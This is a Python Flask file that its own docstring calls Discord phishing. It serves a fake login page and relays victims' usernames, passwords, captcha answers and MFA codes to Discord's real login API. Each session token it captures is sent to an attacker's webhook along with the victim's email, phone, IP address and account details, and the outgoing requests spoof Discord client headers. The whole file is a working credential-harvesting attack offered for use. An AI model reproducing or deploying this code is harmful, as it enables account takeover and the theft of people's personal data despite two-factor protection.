"""
Discord-фишинг: страница входа + прокси к Discord API.
Переменные окружения:
  CLIENT_ID — id твоего Discord-приложения
  HOOK      — URL вебхука
"""
import base64
import json
import os
import threading

import requests
from flask import Flask, jsonify, render_template, request

API       = "https://discord.com/api/v9"
UA        = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
CLIENT_ID = os.environ.get("CLIENT_ID", "")
HOOK      = os.environ.get("HOOK", "")

SUPER = base64.b64encode(json.dumps({
    "os": "Windows", "browser": "Chrome", "device": "", "system_locale": "en-US",
    "browser_user_agent": UA, "browser_version": "126.0.0.0", "os_version": "10",
    "referrer": "", "referring_domain": "", "referrer_current": "",
    "referring_domain_current": "", "release_channel": "stable",
    "client_build_number": 300000, "client_event_source": None,
}, separators=(",", ":")).encode()).decode()

app = Flask(__name__)


def dheaders(token=None):
    h = {
        "User-Agent": UA,
        "Content-Type": "application/json",
        "X-Super-Properties": SUPER,
        "X-Discord-Locale": "en-US",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/",
    }
    if token:
        h["Authorization"] = token
    return h


def client_ip():
    xff = request.headers.get("X-Forwarded-For", "")
    return xff.split(",")[0].strip() if xff else (request.remote_addr or "?")


def send_hook(token, source):
    """Профиль + токен в вебхук. Гоняем в отдельном потоке, чтобы не тормозить ответ."""
    try:
        me = requests.get(f"{API}/users/@me", headers=dheaders(token), timeout=20).json()
    except Exception as e:
        me = {"error": str(e)}

    uname = me.get("username", "?")
    disc  = me.get("discriminator", "0")
    if disc and disc != "0":
        uname = f"{uname}#{disc}"

    payload = {
        "content": f"**Discord token captured** ({source})",
        "embeds": [{
            "title": "Новый токен",
            "color": 0x5865F2,
            "fields": [
                {"name": "Username", "value": uname, "inline": True},
                {"name": "ID", "value": str(me.get("id", "?")), "inline": True},
                {"name": "Email", "value": str(me.get("email")), "inline": True},
                {"name": "Verified", "value": str(me.get("verified")), "inline": True},
                {"name": "MFA", "value": str(me.get("mfa_enabled")), "inline": True},
                {"name": "Phone", "value": str(me.get("phone")), "inline": True},
                {"name": "Nitro", "value": str(me.get("premium_type")), "inline": True},
                {"name": "IP жертвы", "value": client_ip(), "inline": True},
                {"name": "UA", "value": (request.headers.get("User-Agent") or "?")[:200], "inline": False},
                {"name": "Токен", "value": f"```{token}```", "inline": False},
            ],
        }],
    }
    try:
        requests.post(HOOK, json=payload, timeout=20)
    except Exception:
        pass


def fire(token, source):
    threading.Thread(target=send_hook, args=(token, source), daemon=True).start()


@app.get("/")
def page():
    return render_template("index.html", client_id=CLIENT_ID)


@app.get("/health")
def health():
    return "ok"


@app.post("/login")
def login():
    d = request.get_json(force=True)
    body = {
        "login": d["login"],
        "password": d["password"],
        "undelete": False,
        "login_source": None,
        "gift_code_sku_id": None,
    }
    if d.get("captcha_key"):
        body["captcha_key"] = d["captcha_key"]
    if d.get("rqtoken"):
        body["captcha_rqtoken"] = d["rqtoken"]

    r = requests.post(f"{API}/auth/login", json=body, headers=dheaders(), timeout=30)
    data = r.json()
    if r.status_code == 200 and data.get("token"):
        fire(data["token"], "password login")
    return jsonify(data), r.status_code


@app.post("/mfa")
def mfa():
    d = request.get_json(force=True)
    body = {
        "code": d["code"],
        "ticket": d["ticket"],
        "login_source": None,
        "gift_code_sku_id": None,
    }
    if d.get("captcha_key"):
        body["captcha_key"] = d["captcha_key"]
    if d.get("rqtoken"):
        body["captcha_rqtoken"] = d["rqtoken"]

    r = requests.post(f"{API}/auth/mfa/totp", json=body, headers=dheaders(), timeout=30)
    data = r.json()
    if r.status_code == 200 and data.get("token"):
        fire(data["token"], "mfa")
    return jsonify(data), r.status_code


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
